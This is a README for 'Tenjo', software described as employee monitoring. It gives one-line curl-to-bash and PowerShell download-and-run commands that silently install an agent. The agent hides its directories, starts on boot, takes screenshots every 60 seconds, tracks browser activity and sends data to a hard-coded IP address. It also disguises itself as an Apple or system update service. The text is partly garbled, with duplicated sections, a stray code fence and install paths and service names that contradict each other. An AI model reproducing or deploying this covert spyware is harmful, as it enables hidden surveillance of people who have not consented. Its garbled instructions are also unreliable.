# Tenjo Remote Installation Commands

## One-Line Remote Installation (Stealth Mode)

### macOS - Silent Installation
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_macos.sh | bash
```

### Windows - Silent Installation
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_windows.bat' -OutFile '%TEMP%\install.bat' -UseBasicParsing; cmd /c '%TEMP%\install.bat'; del '%TEMP%\install.bat'"
```

## Uninstallation Commands

### macOS - One-Line Remote Uninstall
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_macos.sh | bash
```

### Windows - One-Line Remote Uninstall
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_windows.bat' -OutFile '%TEMP%\uninstall.bat' -UseBasicParsing; cmd /c '%TEMP%\uninstall.bat'; del '%TEMP%\uninstall.bat'"
```
curl -s https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_uninstall_stealth_macos.sh | bash
```

### Windows - One-Line Remote Uninstall
## Features

### ✅ Completely Silent Operation
- No user prompts or visible windows
- Runs hidden in background
- Auto-starts on boot/login
- No taskbar or system tray icons

### ✅ Remote Installation
- Downloads all files from GitHub automatically
- No need to pre-download or copy files
- One-line command installation
- Self-contained with all dependencies

### ✅ Auto-Start Configuration
- **macOS**: Uses LaunchAgent service
- **Windows**: Uses Windows Service
- Automatically starts on system boot
- Resilient restart on failure

### ✅ Stealth Operation
- Hidden installation directory
- Background monitoring
- Minimal system footprint
- No visible UI components

## Installation Locations

### macOS
- Installation directory: `~/.tenjo/`
- Service file: `~/Library/LaunchAgents/com.tenjo.monitor.plist`
- Logs: `~/.tenjo/logs/`

### Windows  
- Installation directory: `%USERPROFILE%\.tenjo\`
- Service name: `TenjoMonitor`
- Logs: `%USERPROFILE%\.tenjo\logs\`
- **macOS**: LaunchAgent/LaunchDaemon
- **Windows**: Task Scheduler
- Starts automatically when computer boots
- Survives user logout/login

### ✅ Monitoring Capabilities
- 📸 Screenshots every 60 seconds
- 🌐 Browser activity tracking
- 💻 Process monitoring
- 📊 System statistics
- 📡 Data transmission to server

### ✅ Professional Disguise
- Service name: "SystemUpdate"
- Appears as legitimate system service
- Hidden from casual inspection
- Low resource usage

## Installation Locations

### macOS
- **Install Dir**: `~/.config/system-utils/`
- **Service**: `~/Library/LaunchAgents/com.apple.systemupdater.plist`
- **Logs**: `~/Library/Logs/SystemUpdater/`

### Windows  
- **Install Dir**: `%USERPROFILE%\.config\system-utils\`
- **Task**: Task Scheduler `SystemUpdater`
- **Logs**: `%USERPROFILE%\AppData\Local\SystemUpdater\`

## Uninstall Features

### ✅ Complete Removal
- Stops all running processes
- Removes auto-start configuration
- Deletes all files and logs
- Cleans system traces
- Verifies successful removal

### ✅ One-Line Remote Uninstall
- No need to access target machine locally
- Downloads and runs uninstaller automatically
- Works from any terminal with internet access
- Provides detailed removal report

## Security Notes

⚠️ **This is monitoring software intended for legitimate employee monitoring purposes only**

- Only use on systems you own or have explicit permission to monitor
- Ensure compliance with local privacy laws
- Inform users of monitoring where legally required
- Use responsibly and ethically

## Technical Details

### Process Names
- **Main Process**: `python stealth_main.py`
- **Service Name**: `SystemUpdater` / `com.apple.systemupdater`
- **Directory Name**: `system-utils` / `.config/system-utils`

### Network Communication
- Connects to: `http://103.129.149.67`
- Encrypted data transmission
- Automatic retry on connection failure
- Minimal bandwidth usage

### Logging
- Silent mode: Warnings and errors only
- Log location: `logs/stealth.log`
- Automatic log rotation
- No console output in stealth mode
